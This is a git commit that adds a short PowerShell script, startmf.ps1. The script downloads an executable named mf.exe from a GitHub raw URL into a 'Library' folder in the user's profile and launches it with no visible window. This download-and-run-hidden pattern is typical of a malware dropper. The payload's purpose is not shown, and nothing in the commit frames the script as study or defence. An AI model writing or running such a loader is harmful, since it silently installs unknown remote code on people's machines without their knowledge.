074d446abb4b8e48644b05740692043aeb3529ec
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-09 23:30:23 -0600

    Add files via upload

---
+++ startmf.ps1
@@ -0,0 +1,18 @@
+$url = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/mf.exe"
+$outputFolder = "$($env:USERPROFILE)\Library"
+$outputFile = "$outputFolder\mf.exe"
+
+# Create the folder if it doesn't exist
+if (-not (Test-Path $outputFolder)) {
+    New-Item -ItemType Directory -Path $outputFolder
+}
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+# Start the executable without a window
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $outputFile
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+[System.Diagnostics.Process]::Start($psi).WaitForExit()
